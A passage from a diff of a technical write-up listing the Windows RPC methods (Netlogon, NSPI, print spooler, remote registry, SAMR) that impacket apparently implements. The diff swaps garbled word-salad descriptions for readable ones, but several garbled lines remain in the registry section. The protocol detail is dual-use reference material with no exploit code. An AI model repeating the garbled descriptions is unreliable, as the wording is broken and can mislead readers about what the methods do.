- 45 : (NetrLogonSamLogonWithFlags, NetrLogonSamLogonWithFlagsResponse),
- 46 : (NetrServerGetTrustInfo, NetrServerGetTrustInfoResponse),
+ 7 : (NetrDatabaseDeltas, NetrDatabaseDeltasResponse),Returns the set of changes (deltas) applied to the SAM, built-in SAM, or LSA database after a given database serial number; a BDC uses it to request the changes it is missing from the PDC
+ 8 : (NetrDatabaseSync, NetrDatabaseSyncResponse),Predecessor of the NetrDatabaseSync2 method
+# 9 : (NetrAccountDeltas, NetrAccountDeltasResponse),Obsoleted method
+# 10 : (NetrAccountSync, NetrAccountSyncResponse),Obsoleted method
+ 11 : (NetrGetDCName, NetrGetDCNameResponse),Retrieves the PDC NetBIOS name of the specified domain
+ 12 : (NetrLogonControl, NetrLogonControlResponse),Predecessor of the NetrLogonControl2Ex method
+ 13 : (NetrGetAnyDCName, NetrGetAnyDCNameResponse),Retrieves the name of a domain controller in the specified primary or directly trusted domain; only a DC can return a DC name from the specified directly trusted domain
+ 14 : (NetrLogonControl2, NetrLogonControl2Response),Predecessor of the NetrLogonControl2Ex method
+ 15 : (NetrServerAuthenticate2, NetrServerAuthenticate2Response),Predecessor of the NetrServerAuthenticate3 method
+ 16 : (NetrDatabaseSync2, NetrDatabaseSync2Response),Returns the set of all changes applied to the specified database since it was created; it gives a BDC a way to fully synchronise its database with the PDC and, because there may be a lot of data, supports retrieving partial changes across a series of calls using a continuation context that can restart at a caller-specified point
+ 17 : (NetrDatabaseRedo, NetrDatabaseRedoResponse),Used by a backup domain controller (BDC) to request information about a single account from the PDC
+ 18 : (NetrLogonControl2Ex, NetrLogonControl2ExResponse),Queries the status of and controls the Netlogon server
+ 19 : (NetrEnumerateTrustedDomains, NetrEnumerateTrustedDomainsResponse),Returns the set of trusted-domain NetBIOS names
+ 20 : (DsrGetDcName, DsrGetDcNameResponse),Predecessor of the DsrGetDcNameEx2 method
+ 21 : (NetrLogonGetCapabilities, NetrLogonGetCapabilitiesResponse),The client uses NetrLogonGetCapabilities after establishing a secure channel to confirm the server's capabilities
+ 22 : (NetrLogonSetServiceBits, NetrLogonSetServiceBitsResponse),Notifies a Netlogon domain controller whether a specified service is running
+ 23 : (NetrLogonGetTrustRid, NetrLogonGetTrustRidResponse),Obtains from the server the RID of the account in the specified domain whose password is used to establish a secure channel
+ 24 : (NetrLogonComputeServerDigest, NetrLogonComputeServerDigestResponse),Computes an encrypted digest of a message with the MD5 message-digest algorithm; called by the server to compute a message digest
+ 25 : (NetrLogonComputeClientDigest, NetrLogonComputeClientDigestResponse),Computes an encrypted digest of a message with the MD5 message-digest algorithm; called by the client to compute a message digest
+ 26 : (NetrServerAuthenticate3, NetrServerAuthenticate3Response),Mutually authenticates client and server and establishes the session key used to protect secure-channel messages; called after NetrServerReqChallenge
+ 27 : (DsrGetDcNameEx, DsrGetDcNameExResponse),Predecessor of the DsrGetDcNameEx2 method
+ 28 : (DsrGetSiteName, DsrGetSiteNameResponse),Returns the site name of the specified computer that received the call
+ 29 : (NetrLogonGetDomainInfo, NetrLogonGetDomainInfoResponse),Returns information describing the current domain of the specified client
+ 30 : (NetrServerPasswordSet2, NetrServerPasswordSet2Response),Allows the client to set a new plaintext password for the account the DC uses to establish a secure channel; domain members use it to rotate their machine account password, and the PDC uses it to rotate trust passwords of directly trusted domains
+ 31 : (NetrServerPasswordGet, NetrServerPasswordGetResponse),Allows a BDC to obtain the machine account password from the DC holding the PDC role
+ 32 : (NetrLogonSendToSam, NetrLogonSendToSamResponse),Allows a BDC or RODC to forward a user account password change to the PDC; used by the client to deliver an opaque buffer to the server-side SAM database
+ 33 : (DsrAddressToSiteNamesW, DsrAddressToSiteNamesWResponse),Translates a list of socket addresses into their corresponding site names
+ 34 : (DsrGetDcNameEx2, DsrGetDcNameEx2Response),Returns information about a DC in the specified domain and site; if AccountName is not NULL and a DC matching the requested capabilities (per Flags) responds during the call, that DC verifies its account database contains the specified AccountName; the server receiving the call need not be a DC
+ 35 : (NetrLogonGetTimeServiceParentDomain, NetrLogonGetTimeServiceParentDomainResponse),Returns the parent domain name of the current domain; the returned name is suitable for passing to NetrLogonGetTrustRid and NetrLogonComputeClientDigest
+ 36 : (NetrEnumerateTrustedDomainsEx, NetrEnumerateTrustedDomainsExResponse),Returns the list of trusted domains from the specified server
+ 37 : (DsrAddressToSiteNamesExW, DsrAddressToSiteNamesExWResponse),Translates a list of socket addresses into their corresponding site names and subnet names
+ 38 : (DsrGetDcSiteCoverageW, DsrGetDcSiteCoverageWResponse),Returns the list of sites covered by a domain controller
+ 39 : (NetrLogonSamLogonEx, NetrLogonSamLogonExResponse),Provides an extension to NetrLogonSamLogon
+ 40 : (DsrEnumerateDomainTrusts, DsrEnumerateDomainTrustsResponse),Returns an enumerated list of domain trusts from the specified server
+ 41 : (DsrDeregisterDnsHostRecords, DsrDeregisterDnsHostRecordsResponse),Should delete all DNS SRV records registered by the specified domain controller
+ 42 : (NetrServerTrustPasswordsGet, NetrServerTrustPasswordsGetResponse),Returns the encrypted current and previous passwords of the account in the domain; the client calls it to retrieve the current and previous account passwords from a domain controller
+ 43 : (DsrGetForestTrustInformation, DsrGetForestTrustInformationResponse),Retrieves forest trust information for the specified DC's forest, or the forest trusted by the specified DC's forest
+ 44 : (NetrGetForestTrustInformation, NetrGetForestTrustInformationResponse),Retrieves the trust information of the forest of which the member domain is itself a member
+ 45 : (NetrLogonSamLogonWithFlags, NetrLogonSamLogonWithFlagsResponse),Handles logon requests for SAM accounts
+ 46 : (NetrServerGetTrustInfo, NetrServerGetTrustInfoResponse),Returns a block of information from the specified server, including the encrypted current and previous passwords of a particular account plus other trust data
 # 48 : (DsrUpdateReadOnlyServerDnsRecords, DsrUpdateReadOnlyServerDnsRecordsResponse),
 # 49 : (NetrChainSetClientAttributes, NetrChainSetClientAttributesResponse),
 }
@@ -2153,28 +2160,28 @@ The module implements the following methods:
 ```python
 OPNUMS = {
  MS-OXNSPI / MS-NSPI
- 0 : (NspiBind, NspiBindResponse),methodclientserversession
- 1 : (NspiUnbind, NspiUnbindResponse),methodonhandle
- 2 : (NspiUpdateStat, NspiUpdateStatResponse),methodSTAT client
-    3  : (NspiQueryRows, NspiQueryRowsResponse),
- 4 : (NspiSeekEntries, NspiSeekEntriesResponse),methodsetsasorspecifiedorreturns information aboutinformation
+ 0 : (NspiBind, NspiBindResponse),Starts a session between client and server
+ 1 : (NspiUnbind, NspiUnbindResponse),Destroys the context handle
+ 2 : (NspiUpdateStat, NspiUpdateStatResponse),Updates the STAT block representing the position in a table to reflect the positioning change requested by the client
+    3  : (NspiQueryRows, NspiQueryRowsResponse),Returns some rows from a specified table to the client; although the protocol sets no minimum, implementations should return as many rows as possible
+ 4 : (NspiSeekEntries, NspiSeekEntriesResponse),Searches and sets the logical position in a specific table to the first entry greater than or equal to the specified value; it may also return information about rows in the table
 #    5  : (NspiGetMatches, NspiGetMatchesResponse),
 #    6  : (NspiResortRestriction, NspiResortRestrictionResponse),
-    7  : (NspiDNToMId, NspiDNToMIdResponse),
- 8 : (NspiGetPropList, NspiGetPropListResponse),methodreturnsinspecifiedobjectonalllist
- 9 : (NspiGetProps, NspiGetPropsResponse),methodreturnscontainingobjectoningroup
- 10 : (NspiCompareMIds, NspiCompareMIdsResponse),method IDobjectinreturns
+    7  : (NspiDNToMId, NspiDNToMIdResponse),Maps a set of DNs to a set of minimal entry IDs
+ 8 : (NspiGetPropList, NspiGetPropListResponse),Returns the list of all properties that have values on the specified object
+ 9 : (NspiGetProps, NspiGetPropsResponse),Returns the address-book row containing a set of properties and values present on the object
+ 10 : (NspiCompareMIds, NspiCompareMIdsResponse),Compares the positions within the address-book container of two objects identified by their minimal entry IDs and returns the comparison value
 #    11 : (NspiModProps, NspiModPropsResponse),
- 12 : (NspiGetSpecialTable, NspiGetSpecialTableResponse),method returnsclientcanor
- 13 : (NspiGetTemplateInfo, NspiGetTemplateInfoResponse),methodreturns information aboutobjectinformation
- 14 : (NspiModLinkAtt, NspiModLinkAttResponse),methodmodifiesmodifiesasDT_DISTLISTobjectPidTagAddressBookMember PidTagAddressBookPublicDelegates as DT_MAILUSER object
+ 12 : (NspiGetSpecialTable, NspiGetSpecialTableResponse),Returns the rows of a special table to the client; the special table may be the address-book hierarchy table or the address-creation table
+ 13 : (NspiGetTemplateInfo, NspiGetTemplateInfoResponse),Returns information about a template object in the address book
+ 14 : (NspiModLinkAtt, NspiModLinkAttResponse),Modifies the value of a specific property on a specific row in the address book; only supports PidTagAddressBookMember on DT_DISTLIST objects and PidTagAddressBookPublicDelegates on DT_MAILUSER objects
 #    15 : (NspiDeleteEntries, NspiDeleteEntriesResponse),
- 16 : (NspiQueryColumns, NspiQueryColumnsResponse),methodreturnsserveralllistthislistas proptags groupreturns
+ 16 : (NspiQueryColumns, NspiQueryColumnsResponse),Returns the list of all properties known to the server, as a proptags array
  MS-NSPI
- 17 : (NspiGetNamesFromIDs, NspiGetNamesFromIDsResponse), methodreturnsgroupproptagsnamelist
- 18 : (NspiGetIDsFromNames, NspiGetIDsFromNamesResponse),returnsgroupnameproptagslist
- 19 : (NspiResolveNames, NspiResolveNamesResponse),method 8 groupANR
- 20 : (NspiResolveNamesW, NspiResolveNamesWResponse),methodUnicode groupANRname
+ 17 : (NspiGetNamesFromIDs, NspiGetNamesFromIDsResponse),Returns the list of property names for a set of proptags
+ 18 : (NspiGetIDsFromNames, NspiGetIDsFromNamesResponse),Returns the proptags list for a set of property names
+ 19 : (NspiResolveNames, NspiResolveNamesResponse),Takes a set of 8-bit string values and performs ANR (ambiguous name resolution) on them
+ 20 : (NspiResolveNamesW, NspiResolveNamesWResponse),Takes a set of Unicode string values and performs ANR (ambiguous name resolution) on them
 }
 ```
 
@@ -2215,8 +2222,8 @@ The module implements two methods:
 
 ```python
 OPNUMS = {
- 0 : (RfrGetNewDSA, RfrGetNewDSAResponse),methodreturnsNSPI serverorservergroupname
- 1 : (RfrGetFQDNFromServerDN, RfrGetFQDNFromServerDNResponse),methodreturnswithDNserverrealm (DNS) FQDN
+ 0 : (RfrGetNewDSA, RfrGetNewDSAResponse),Returns the name of the NSPI server or an array of servers
+ 1 : (RfrGetFQDNFromServerDN, RfrGetFQDNFromServerDNResponse),Returns the DNS FQDN of the server corresponding to the passed DN
 }
 ```
 
@@ -2364,13 +2371,13 @@ The module implements the following methods:
 
 ```python
 OPNUMS = {
- 0 : (RpcAsyncOpenPrinter, RpcAsyncOpenPrinterResponse),specifiedprintprintorprintserverhandleclientthismethodobtainsonprintprinthandle
+ 0 : (RpcAsyncOpenPrinter, RpcAsyncOpenPrinterResponse),Specifies the handle to a printer, port, print job, or print server; the client uses it to obtain the print handle of an existing printer on the remote computer
     #1  : (RpcAsyncAddPrinter, RpcAsyncAddPrinterResponse),
- 20 : (RpcAsyncClosePrinter, RpcAsyncClosePrinterResponse),closesRpcAsyncOpenPrinterorRpcAsyncAddPrinteropensprintserverorobjecthandle
- 38 : (RpcAsyncEnumPrinters, RpcAsyncEnumPrintersResponse),enumeratesprintspecifiedprintserveronprintspecifieddomainprintorprint
- 39 : (RpcAsyncAddPrinterDriver, RpcAsyncAddPrinterDriver),inspecifiedprintserveronspecifiedorprintdriverdriver
- 40 : (RpcAsyncEnumPrinterDrivers, RpcAsyncEnumPrinterDriversResponse),enumeratesinspecifiedprintserveronprintdriver
- 41 : (RpcAsyncGetPrinterDriverDirectory, RpcAsyncGetPrinterDriverDirectoryResponse)retrievesspecifiedprintserveronprintdriver
+ 20 : (RpcAsyncClosePrinter, RpcAsyncClosePrinterResponse),Closes a handle to a printer, server, job, or port object previously opened by RpcAsyncOpenPrinter or RpcAsyncAddPrinter
+ 38 : (RpcAsyncEnumPrinters, RpcAsyncEnumPrintersResponse),Enumerates available local printers, printers on a specified print server, printers in a specified domain, or print providers
+ 39 : (RpcAsyncAddPrinterDriver, RpcAsyncAddPrinterDriver),Installs the specified local or remote printer driver on the specified print server and links config, data and driver files
+ 40 : (RpcAsyncEnumPrinterDrivers, RpcAsyncEnumPrinterDriversResponse),Enumerates the printer drivers installed on the specified print server
+ 41 : (RpcAsyncGetPrinterDriverDirectory, RpcAsyncGetPrinterDriverDirectoryResponse)Retrieves the path to the printer driver directory on the specified print server
 }
 ```
 
@@ -2388,28 +2395,28 @@ Let's first look at which interface methods the module implements:
 
 ```python
 OPNUMS = {
- 0 : (RpcEnumPrinters, RpcEnumPrintersResponse),enumeratesprintprintserverdomainorprint
- 1 : (RpcOpenPrinter, RpcOpenPrinterResponse),retrievesprintprintorprintserverhandle
- 10 : (RpcEnumPrinterDrivers, RpcEnumPrinterDriversResponse),enumeratesinspecifiedprintserveronprintdriver
- 12 : (RpcGetPrinterDriverDirectory, RpcGetPrinterDriverDirectoryResponse),retrievesprintdriver
- 29 : (RpcClosePrinter, RpcClosePrinterResponse),closesprintobjectserverobjectobjectorobjecthandle
+ 0 : (RpcEnumPrinters, RpcEnumPrintersResponse),Enumerates available printers, print servers, domains, or print providers
+ 1 : (RpcOpenPrinter, RpcOpenPrinterResponse),Retrieves a handle to a printer, port, port monitor, print job, or print server
+ 10 : (RpcEnumPrinterDrivers, RpcEnumPrinterDriversResponse),Enumerates the printer drivers installed on the specified print server
+ 12 : (RpcGetPrinterDriverDirectory, RpcGetPrinterDriverDirectoryResponse),Retrieves the path to the printer driver directory
+ 29 : (RpcClosePrinter, RpcClosePrinterResponse),Closes a handle to a printer, server, job, or port object
     
     
     
- 65 : (RpcRemoteFindFirstPrinterChangeNotificationEx, RpcRemoteFindFirstPrinterChangeNotificationExResponse), creates aobjectprintobject RpcRouterReplyPrinter or RpcRouterReplyPrinterEx printclient
- # 1. objectused forusersets
- # 2. returnsclientservermustthemustin pszLocalMachine namespecifiedclienton RpcReplyOpenPrinter
- # 3. objectwith hPrinter on
- # 4. onservertheclientaddsprintobjectorserverobjectclientlistobject RpcRouterReplyPrinter or RpcRouterReplyPrinterEx client
- # 5. methodnot RpcRemoteFindFirstPrinterChangeNotification Ex RpcRouterReplyPrinter fdwFlags or RpcRouterReplyPrinterEx information
- # 6. returns
+ 65 : (RpcRemoteFindFirstPrinterChangeNotificationEx, RpcRemoteFindFirstPrinterChangeNotificationExResponse),Creates a remote change-notification object that monitors a printer object and delivers notifications to the print client via RpcRouterReplyPrinter or RpcRouterReplyPrinterEx. Server-side flow:
+ # 1. Create and initialise a notification object to capture the notification settings requested by the user.
+ # 2. Create and initialise a notification channel back to the client, over which the server must deliver change notifications. This must be done by calling RpcReplyOpenPrinter on the client named by pszLocalMachine.
+ # 3. Associate the notification object with the context of hPrinter.
+ # 4. After the above steps, the server should add the client to the notification client list of the printer or server object; when the object changes, notify the client via RpcRouterReplyPrinter or RpcRouterReplyPrinterEx.
+ # 5. The choice of notification method does not depend on whether the request used RpcRemoteFindFirstPrinterChangeNotification or its Ex variant, but on whether the notification can be expressed with RpcRouterReplyPrinter's fdwFlags alone or needs the extra parameters of RpcRouterReplyPrinterEx.
+ # 6. Return the status of the operation.
     
     
     
     
     
- 69 : (RpcOpenPrinterEx, RpcOpenPrinterExResponse),retrievesprintprintorprintserverhandle
- 89 : (RpcAddPrinterDriverEx, RpcAddPrinterDriverExResponse), inprintserveronprintdriver RpcAddPrinterDriverspecifieddrivertimestampall
+ 69 : (RpcOpenPrinterEx, RpcOpenPrinterExResponse),Retrieves a handle to a printer, port, port monitor, print job, or print server
+ 89 : (RpcAddPrinterDriverEx, RpcAddPrinterDriverExResponse),Installs a printer driver on the print server; similar to RpcAddPrinterDriver but also supports options such as driver upgrade, downgrade, copying only newer files, and copying all files ignoring timestamps
 }
 ```
 
@@ -2498,39 +2505,39 @@ The module implements the following methods:
 
 ```python
 OPNUMS = {
- 0 : (OpenClassesRoot, OpenClassesRootResponse),Called by the client. In response, the serveropensHKEY_CLASSES_ROOT
- 1 : (OpenCurrentUser, OpenCurrentUserResponse),Called by the client. In response, the serveropens HKEY_CURRENT_USER handleservermust HKEY_USERS HKEY_CURRENT_USER
- 2 : (OpenLocalMachine, OpenLocalMachineResponse),Called by the client. In response, the serveropensHKEY_LOCAL_MACHINEregistryhandle
- 3 : (OpenPerformanceData, OpenPerformanceDataResponse),Called by the client. In response, the serveropensHKEY_PERFORMANCE_DATA handleHKEY_PERFORMANCE_DATA used forBaseRegQueryInfoKey BaseRegQueryValueBaseRegEnumValueBaseRegCloseKey methodregistryserverretrievesinformation
- 4 : (OpenUsers, OpenUsersResponse),Called by the client. In response, the serveropensHKEY_USERSregistryhandle
- 5 : (BaseRegCloseKey, BaseRegCloseKeyResponse),Called by the client. In response, the serverclosesspecifiedregistryhandle
- 6 : (BaseRegCreateKey, BaseRegCreateKeyResponse),Called by the client. In response, the servercreates the specifiedregistryreturnsregistryhandleifregistryinregistrythenopensreturnshandle
+ 0 : (OpenClassesRoot, OpenClassesRootResponse),Called by the client; in response the server opens the HKEY_CLASSES_ROOT predefined key
+ 1 : (OpenCurrentUser, OpenCurrentUserResponse),Called by the client; in response the server opens a handle to HKEY_CURRENT_USER and must determine which HKEY_USERS subkey maps to it
+ 2 : (OpenLocalMachine, OpenLocalMachineResponse),Called by the client; in response the server opens a handle to the HKEY_LOCAL_MACHINE predefined key
+ 3 : (OpenPerformanceData, OpenPerformanceDataResponse),Called by the client; in response the server opens a handle to HKEY_PERFORMANCE_DATA, used with BaseRegQueryInfoKey/BaseRegQueryValue/BaseRegEnumValue/BaseRegCloseKey only to retrieve performance information
+ 4 : (OpenUsers, OpenUsersResponse),Called by the client; in response the server opens a handle to the HKEY_USERS predefined key
+ 5 : (BaseRegCloseKey, BaseRegCloseKeyResponse),Called by the client; in response the server destroys (closes) the handle to the specified registry key
+ 6 : (BaseRegCreateKey, BaseRegCreateKeyResponse),Called by the client; in response the server creates the specified registry key and returns its handle, or opens and returns the handle of an existing key
  7 : (BaseRegDeleteKey, BaseRegDeleteKeyResponse),Called by the client. In response, the serverdeletes the specified
- 8 : (BaseRegDeleteValue, BaseRegDeleteValueResponse),Called by the client. In response, the serverspecifiedregistrydeletes
- 9 : (BaseRegEnumKey, BaseRegEnumKeyResponse),enumeratesasserverreturns
-10 : (BaseRegEnumValue, BaseRegEnumValueResponse),Called by the client. In response, the serverenumeratesspecifiedregistryspecified
+ 8 : (BaseRegDeleteValue, BaseRegDeleteValueResponse),Called by the client; in response the server deletes the named value from the specified registry key
+ 9 : (BaseRegEnumKey, BaseRegEnumKeyResponse),Enumerates subkeys; in response the server returns the requested subkey
+10 : (BaseRegEnumValue, BaseRegEnumValueResponse),Called by the client; in response the server enumerates the value at the specified index of the specified registry key
 11 : (BaseRegFlushKey, BaseRegFlushKeyResponse),Called by the client. In response, the serverhKeyall entryregistry
-12 : (BaseRegGetKeySecurity, BaseRegGetKeySecurityResponse),Called by the client. In response, the serverreturnsspecifiedopensregistry
+12 : (BaseRegGetKeySecurity, BaseRegGetKeySecurityResponse),Called by the client; in response the server returns a copy of the security descriptor protecting the specified open registry key
 13 : (BaseRegLoadKey, BaseRegLoadKeyResponse),Called by the client. In response, the server entryregistry
  15 : (BaseRegOpenKey, BaseRegOpenKeyResponse),Called by the client. In response, the serveropens the specifiedregistryreturns ahandle
- 16 : (BaseRegQueryInfoKey, BaseRegQueryInfoKeyResponse),Called by the client. In response, the serverreturns the specifiedregistryhandleinformation
-17 : (BaseRegQueryValue, BaseRegQueryValueResponse),Called by the client. In response, the serverreturnswithspecifiedregistryopensifspecifiednamethenserverreturnswithspecifiedregistry opens
- 18 : (BaseRegReplaceKey, BaseRegReplaceKeyResponse),
-19 : (BaseRegRestoreKey, BaseRegRestoreKeyResponse),serverspecifiedregistryinformationspecifiedonregistryinformation
-20 : (BaseRegSaveKey, BaseRegSaveKeyResponse),serverspecified
-21 : (BaseRegSetKeySecurity, BaseRegSetKeySecurityResponse),serversetsspecifiedregistry
-22 : (BaseRegSetValue, BaseRegSetValueResponse),serverasregistryspecifiedsets
- 23 : (BaseRegUnLoadKey, BaseRegUnLoadKeyResponse),serverregistryasspecifiedgroup
+ 16 : (BaseRegQueryInfoKey, BaseRegQueryInfoKeyResponse),Called by the client; in response the server returns information about the specified registry key handle
+17 : (BaseRegQueryValue, BaseRegQueryValueResponse),Called by the client; in response the server returns the data associated with the named value of the specified open registry key, or with the default value if no name is given
+ 18 : (BaseRegReplaceKey, BaseRegReplaceKeyResponse),Called by the client; the server replaces the backing file of the specified registry key and its subkeys with the specified file, taking effect after the next system restart
+19 : (BaseRegRestoreKey, BaseRegRestoreKeyResponse),The server reads registry information from the specified file and copies it onto the specified key; the information takes the form of a key and multiple levels of subkeys
+20 : (BaseRegSaveKey, BaseRegSaveKeyResponse),The server saves the specified key, its subkeys and values to a new file
+21 : (BaseRegSetKeySecurity, BaseRegSetKeySecurityResponse),The server sets the security descriptor protecting the specified open registry key
+22 : (BaseRegSetValue, BaseRegSetValueResponse),The server sets data for the specified value of a registry key
+ 23 : (BaseRegUnLoadKey, BaseRegUnLoadKeyResponse),The server unloads the subtree (hive) rooted at the specified key, subkeys and values
 
 BaseRegUnLoadKey
-26 : (BaseRegGetVersion, BaseRegGetVersionResponse),serverreturns serverclientserver BaseRegGetVersion method toregistryserver 32 64
-27 : (OpenCurrentConfig, OpenCurrentConfigResponse),serveropensHKEY_CURRENT_CONFIG handle
-29 : (BaseRegQueryMultipleValues, BaseRegQueryMultipleValuesResponse),serverreturnswithspecifiedregistryclientspecifiednamelist
-31 : (BaseRegSaveKeyEx, BaseRegSaveKeyExResponse),serverspecifiedBaseRegSaveKeyEx methodor
-32 : (OpenPerformanceText, OpenPerformanceTextResponse),serveropensHKEY_PERFORMANCE_TEXT handleHKEY_PERFORMANCE_TEXTused forBaseRegQueryInfoKey BaseRegQueryValueBaseRegEnumValueBaseRegCloseKey methodregistryserverretrievesinformation
-33 : (OpenPerformanceNlsText, OpenPerformanceNlsTextResponse),serveropensHKEY_PERFORMANCE_NLSTEXT handleHKEY_PERFORMANCE_NLSTEXT used forBaseRegQueryInfoKey BaseRegQueryValueBaseRegEnumValueBaseRegCloseKey methodregistryserverretrievesinformation
-34 : (BaseRegQueryMultipleValues2, BaseRegQueryMultipleValues2Response),serverreturnswithspecifiedregistryclientspecifiednamelist
- 35 : (BaseRegDeleteKeyEx, BaseRegDeleteKeyExResponse),serverdeletes the specifiedregistry
+26 : (BaseRegGetVersion, BaseRegGetVersionResponse),Returns the version of the remote registry server, used by client and server to determine whether both the 32-bit and 64-bit key namespaces are supported
+27 : (OpenCurrentConfig, OpenCurrentConfigResponse),The server attempts to open a handle to the HKEY_CURRENT_CONFIG predefined key
+29 : (BaseRegQueryMultipleValues, BaseRegQueryMultipleValuesResponse),The server returns the types and data for the client-specified list of value names associated with the specified registry key
+31 : (BaseRegSaveKeyEx, BaseRegSaveKeyExResponse),The server saves the specified key, subkeys and values to a new file; BaseRegSaveKeyEx accepts flags that determine the saved format
+32 : (OpenPerformanceText, OpenPerformanceTextResponse),The server opens a handle to HKEY_PERFORMANCE_TEXT, used with BaseRegQueryInfoKey/BaseRegQueryValue/BaseRegEnumValue/BaseRegCloseKey only to retrieve performance information
+33 : (OpenPerformanceNlsText, OpenPerformanceNlsTextResponse),The server opens a handle to HKEY_PERFORMANCE_NLSTEXT, used with BaseRegQueryInfoKey/BaseRegQueryValue/BaseRegEnumValue/BaseRegCloseKey only to retrieve performance information
+34 : (BaseRegQueryMultipleValues2, BaseRegQueryMultipleValues2Response),The server returns the types and data for the client-specified list of value names associated with the specified registry key
+ 35 : (BaseRegDeleteKeyEx, BaseRegDeleteKeyExResponse),The server deletes the specified registry key
 }
 ```
 
@@ -2593,67 +2600,67 @@ First let's see which interface methods impacket implements:
 
 ```python
 OPNUMS = {
- 0 : (SamrConnect, SamrConnectResponse),returnsserverobjecthandle
- 1 : (SamrCloseHandle, SamrCloseHandleResponse),closesreleasesserverthis RPC onhandle
- 2 : (SamrSetSecurityObject, SamrSetSecurityObjectResponse),setsserverdomainusergrouporobject
- 3 : (SamrQuerySecurityObject, SamrQuerySecurityObjectResponse),queriesserverdomainusergrouporobject
- 5 : (SamrLookupDomainInSamServer, SamrLookupDomainInSamServerResponse),inobjectnameobtainsdomainobjectSID
- 6 : (SamrEnumerateDomainsInSamServer, SamrEnumerateDomainsInSamServerResponse),obtainstheserveralldomainlist
- 7 : (SamrOpenDomain, SamrOpenDomainResponse),inSIDobtainsdomainobjecthandle
- 8 : (SamrQueryInformationDomain, SamrQueryInformationDomainResponse),
- 9 : (SamrSetInformationDomain, SamrSetInformationDomainResponse),
-10 : (SamrCreateGroupInDomain, SamrCreateGroupInDomainResponse),indomaincreates agroupobject
-11 : (SamrEnumerateGroupsInDomain, SamrEnumerateGroupsInDomainResponse),enumeratesallgroup
-12 : (SamrCreateUserInDomain, SamrCreateUserInDomainResponse),creates auser
-13 : (SamrEnumerateUsersInDomain, SamrEnumerateUsersInDomainResponse),enumeratesalluser
-14 : (SamrCreateAliasInDomain, SamrCreateAliasInDomainResponse),
-15 : (SamrEnumerateAliasesInDomain, SamrEnumerateAliasesInDomainResponse),enumeratesall
-16 : (SamrGetAliasMembership, SamrGetAliasMembershipResponse),obtainsSIDall
-17 : (SamrLookupNamesInDomain, SamrLookupNamesInDomainResponse),
-18 : (SamrLookupIdsInDomain, SamrLookupIdsInDomainResponse),
-19 : (SamrOpenGroup, SamrOpenGroupResponse),
-20 : (SamrQueryInformationGroup, SamrQueryInformationGroupResponse),
-21 : (SamrSetInformationGroup, SamrSetInformationGroupResponse),
-22 : (SamrAddMemberToGroup, SamrAddMemberToGroupResponse),
-23 : (SamrDeleteGroup, SamrDeleteGroupResponse),deletes agroupobject
-24 : (SamrRemoveMemberFromGroup, SamrRemoveMemberFromGroupResponse),
-25 : (SamrGetMembersInGroup, SamrGetMembersInGroupResponse),
-26 : (SamrSetMemberAttributesOfGroup, SamrSetMemberAttributesOfGroupResponse),sets
-27 : (SamrOpenAlias, SamrOpenAliasResponse),
-28 : (SamrQueryInformationAlias, SamrQueryInformationAliasResponse),
-29 : (SamrSetInformationAlias, SamrSetInformationAliasResponse),
-30 : (SamrDeleteAlias, SamrDeleteAliasResponse),deletesobject
-31 : (SamrAddMemberToAlias, SamrAddMemberToAliasResponse),
-32 : (SamrRemoveMemberFromAlias, SamrRemoveMemberFromAliasResponse),
-33 : (SamrGetMembersInAlias, SamrGetMembersInAliasResponse),obtainslist
-34 : (SamrOpenUser, SamrOpenUserResponse),
-35 : (SamrDeleteUser, SamrDeleteUserResponse),deletesuserobject
-36 : (SamrQueryInformationUser, SamrQueryInformationUserResponse),
-37 : (SamrSetInformationUser, SamrSetInformationUserResponse),
-38 : (SamrChangePasswordUser, SamrChangePasswordUserResponse),
-39 : (SamrGetGroupsForUser, SamrGetGroupsForUserResponse),obtainsusergrouplist
-40 : (SamrQueryDisplayInformation, SamrQueryDisplayInformationResponse),
-41 : (SamrGetDisplayEnumerationIndex, SamrGetDisplayEnumerationIndexResponse),obtainslist
-44 : (SamrGetUserDomainPasswordInformation, SamrGetUserDomainPasswordInformationResponse),obtainspasswordpolicyinformationnotdomainhandle
-45 : (SamrRemoveMemberFromForeignDomain, SamrRemoveMemberFromForeignDomainResponse),
-46 : (SamrQueryInformationDomain2, SamrQueryInformationDomain2Response),
-47 : (SamrQueryInformationUser2, SamrQueryInformationUser2Response),
-48 : (SamrQueryDisplayInformation2, SamrQueryDisplayInformation2Response),
-49 : (SamrGetDisplayEnumerationIndex2, SamrGetDisplayEnumerationIndex2Response),obtainslistwithclientlist
-50 : (SamrCreateUser2InDomain, SamrCreateUser2InDomainResponse),creates auser
-51 : (SamrQueryDisplayInformation3, SamrQueryDisplayInformation3Response),
-52 : (SamrAddMultipleMembersToAlias, SamrAddMultipleMembersToAliasResponse),
-53 : (SamrRemoveMultipleMembersFromAlias, SamrRemoveMultipleMembersFromAliasResponse),
-54 : (SamrOemChangePasswordUser2, SamrOemChangePasswordUser2Response),
-55 : (SamrUnicodeChangePasswordUser2, SamrUnicodeChangePasswordUser2Response),
-56 : (SamrGetDomainPasswordInformation, SamrGetDomainPasswordInformationResponse),obtainspasswordpolicyinformationserver
-57 : (SamrConnect2, SamrConnect2Response),returnsserverobjecthandle
-58 : (SamrSetInformationUser2, SamrSetInformationUser2Response),
-62 : (SamrConnect4, SamrConnect4Response),obtainsserverobjecthandle
-64 : (SamrConnect5, SamrConnect5Response),obtainsserverobjecthandle
-65 : (SamrRidToSid, SamrRidToSidResponse),inRID obtainsSID
-66 : (SamrSetDSRMPassword, SamrSetDSRMPasswordResponse),setspassword
-67 : (SamrValidatePassword, SamrValidatePasswordResponse),
+ 0 : (SamrConnect, SamrConnectResponse),Returns a handle to the server object
+ 1 : (SamrCloseHandle, SamrCloseHandleResponse),Closes (frees the server-side resources of) any context handle obtained from this RPC interface
+ 2 : (SamrSetSecurityObject, SamrSetSecurityObjectResponse),Sets the access control on a server, domain, user, group, or alias object
+ 3 : (SamrQuerySecurityObject, SamrQuerySecurityObjectResponse),Queries the access control on a server, domain, user, group, or alias object
+ 5 : (SamrLookupDomainInSamServer, SamrLookupDomainInSamServerResponse),Obtains the SID of a domain object given its name
+ 6 : (SamrEnumerateDomainsInSamServer, SamrEnumerateDomainsInSamServerResponse),Obtains the list of all domains hosted by the server side of this protocol
+ 7 : (SamrOpenDomain, SamrOpenDomainResponse),Obtains a handle to a domain object given its SID
+ 8 : (SamrQueryInformationDomain, SamrQueryInformationDomainResponse),Gets attributes from a domain object
+ 9 : (SamrSetInformationDomain, SamrSetInformationDomainResponse),Updates attributes of a domain object
+10 : (SamrCreateGroupInDomain, SamrCreateGroupInDomainResponse),Creates a group object in a domain
